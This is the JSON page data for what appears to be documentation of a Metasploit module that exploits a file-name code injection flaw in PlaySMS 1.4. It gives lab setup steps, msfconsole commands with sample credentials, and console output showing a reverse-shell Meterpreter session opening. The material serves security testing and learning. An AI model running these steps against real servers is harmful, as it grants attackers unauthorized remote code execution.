{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/multi/http/playsms_filename_exec","result":{"data":{"moduleMetadataJson":{"id":"3bef60da-b830-5e38-83c7-e9089852b1e1","name":"PlaySMS sendfromfile.php Authenticated \"Filename\" Field Code Execution","fullname":"exploit/multi/http/playsms_filename_exec","description":"This module exploits a code injection vulnerability within an authenticated file\n          upload feature in PlaySMS v1.4. This issue is caused by improper file name handling\n          in sendfromfile.php file.\n          Authenticated Users can upload a file and rename the file with a malicious payload.\n          This module was tested against PlaySMS 1.4 on VulnHub's Dina 1.0 machine and Windows 7.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/multi/http/playsms_filename_exec","documentationSlug":"/modules/documentation/exploit/multi/http/playsms_filename_exec","referencesSlug":"/modules/references/exploit/multi/http/playsms_filename_exec"},"documentation":{"html":"<h2 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h2>\n<p>This module exploits a code injection vulnerability within an authenticated file upload feature in PlaySMS v1.4. This issue is caused by improper file name handling in sendfromfile.php file. Authenticated Users can upload a file and rename the file with a malicious payload. Additional information and vulnerabilities can be viewed on Exploit-DB <a href=\"https://www.exploit-db.com/exploits/42003/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">42044</a>.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<p>Available at <a href=\"https://www.exploit-db.com/apps/577b6363d3e8baf4696744f911372ea6-playsms-1.4.tar.gz\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Exploit-DB</a></p>\n<h3 id=\"vulnerable-application-installation-setup\" style=\"position:relative;\"><a href=\"#vulnerable-application-installation-setup\" aria-label=\"vulnerable application installation setup permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application Installation Setup.</h3>\n<ol>\n<li>Download Application : <code class=\"language-text\">wget https://www.exploit-db.com/apps/577b6363d3e8baf4696744f911372ea6-playsms-1.4.tar.gz</code></li>\n<li>Extract : <code class=\"language-text\">tar -xvf 577b6363d3e8baf4696744f911372ea6-playsms-1.4.tar.gz</code></li>\n<li>Move In WebDirectory : <code class=\"language-text\">mv playsms-1.4/web/* /var/www/html/</code></li>\n<li>make config file: <code class=\"language-text\">cp /var/www/html/config-dist.php /var/www/html/config.php</code></li>\n<li>Change Owner : <code class=\"language-text\">chown -R www-data:www-data /var/www/html/</code></li>\n<li>Set DB creds in config.php File. And dump playsms-1.4/db/playsms.sql in your playsms database.</li>\n<li>Now Visit : <a href=\"http://localhost/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">http://localhost/</a></li>\n</ol>\n<h2 id=\"verification-steps-1\" style=\"position:relative;\"><a href=\"#verification-steps-1\" aria-label=\"verification steps 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Install the application</li>\n<li>Start msfconsole</li>\n<li>Do: <code class=\"language-text\">use exploit/multi/http/playsms_filename_exec</code></li>\n<li>Do: <code class=\"language-text\">set rport &lt;port&gt;</code></li>\n<li>Do: <code class=\"language-text\">set rhost &lt;ip&gt;</code></li>\n<li>Do: <code class=\"language-text\">set targeturi SecreTSMSgatwayLogin</code></li>\n<li>Do: <code class=\"language-text\">set username touhid</code></li>\n<li>Do: <code class=\"language-text\">set password diana</code></li>\n<li>\n<p>Do: <code class=\"language-text\">check</code></p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">[*] 10.22.1.10:80 The target appears to be vulnerable.</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n</li>\n<li>Do: <code class=\"language-text\">set lport &lt;port&gt;</code></li>\n<li>Do: <code class=\"language-text\">set lhost &lt;ip&gt;</code></li>\n<li>Do: <code class=\"language-text\">exploit</code></li>\n<li>You should get a shell.</li>\n</ol>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"playsms-on-ubuntu-linux\" style=\"position:relative;\"><a href=\"#playsms-on-ubuntu-linux\" aria-label=\"playsms on ubuntu linux permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Playsms on Ubuntu Linux</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf exploit(multi/http/playsms_filename_exec) &gt; run                                                                                    \n                                                                                                                                       \n[*] Started reverse TCP handler on 10.22.1.3:4444                                                                                      \n[+] X-CSRF-Token for login : 13bce9776cfc270a3779e8b557330cc2                                                                          \n[*] Trying to Login ......                                                                                                             \n[+] Authentication successful : [ touhid:diana ]                                                                                       \n[+] X-CSRF-Token for upload : 2780d48dc11a482a58d8a95ad873c6cc                                                                         \n[*] Trying to upload file with malicious Filename Field....                                                                            \n[*] Sending stage (37775 bytes) to 10.22.1.15                                                                                          \n[*] Sleeping before handling stage...                                                                                                  \n[*] Meterpreter session 1 opened (10.22.1.3:4444 -&gt; 10.22.1.15:38814) at 2018-04-08 13:45:34 +0530                                     \n                                                                                                                                       \nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"3bef60da-b830-5e38-83c7-e9089852b1e1"}}}